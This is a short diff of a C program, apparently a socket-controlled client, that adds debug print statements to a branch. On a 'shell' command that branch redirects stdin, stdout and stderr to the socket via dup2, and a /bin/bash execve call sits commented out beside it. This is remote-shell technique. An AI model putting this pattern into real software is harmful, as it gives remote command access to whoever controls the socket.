@@ -68,13 +68,14 @@ int main (int argc, char const *argv[]){
 			exit(0);
 		}
 		else if(!strcmp(message,"shell\n")){
-			
+		        printf("REDIRECTING\n");	
 			//redirect stdin, stdout, and stderr
 			//to the socket
 			for (int i=0; i<3; i++){
 				dup2(sock, i);
 			}
 			
+                        printf("\nPRINTING\n");
 			//executing the shell
 			//execve("/bin/bash", NULL, NULL);
 			//fprintf(stdout, "%s", "Hello world\n");
